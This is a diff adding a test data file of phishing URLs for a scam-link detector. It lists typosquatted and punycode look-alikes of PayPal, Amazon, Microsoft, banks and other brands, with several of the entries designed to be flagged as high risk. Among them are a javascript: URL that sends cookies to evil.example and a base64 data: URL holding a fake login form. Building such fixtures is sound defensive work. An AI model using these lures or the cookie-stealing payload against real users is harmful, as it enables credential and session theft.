@@ -1,0 +1,36 @@
+# Look-alike and scam URLs. Format: url [| link text]. Every line must be flagged high or critical.
+https://xn--pypal-4ve.com/signin
+https://xn--80ak6aa92e.com/
+https://paypa1.com/login
+https://paypal-login-verify.com/
+https://www.paypal.com.account-check.xyz/webapps/mpp
+https://secure-paypal.help/
+https://arnazon.com/gp/signin
+https://amazon-refund-center.com/
+https://micros0ft-support.com/
+https://login.microsoftonline.com.verify-session.io/
+https://rnicrosoft.com/account
+https://netfIix-billing.com/
+https://netflix-account-update.top/
+https://appleid-verify.com/
+https://icloud-unlock.support/
+https://g00gle.com/accounts
+https://walmart-giftcard-claim.click/
+https://chase-secure-alerts.com/
+https://bankofamerica-online.xyz/
+https://wellsfarg0.com/
+https://coinbase-wallet-connect.app/
+https://metamask-restore.io/
+https://steamcommunity-gift.ru/
+https://steamcornmunity.com/tradeoffer
+https://discord-nitro-gift.com/
+https://usps-redelivery.info/
+https://dhl-parcel-tracking.top/
+https://docusign-review.online/
+https://claude-ai-login.com/
+https://user@paypal.com@evil.example/
+https://evil.example/signin | www.paypal.com
+https://tracking.example.net/r?x=1 | https://www.chase.com/alerts
+javascript:fetch('https://evil.example/?c='+document.cookie)
+data:text/html;base64,PGgxPlBheVBhbDwvaDE+PGZvcm0+
+http://192.168.4.20/paypal/login | - | login
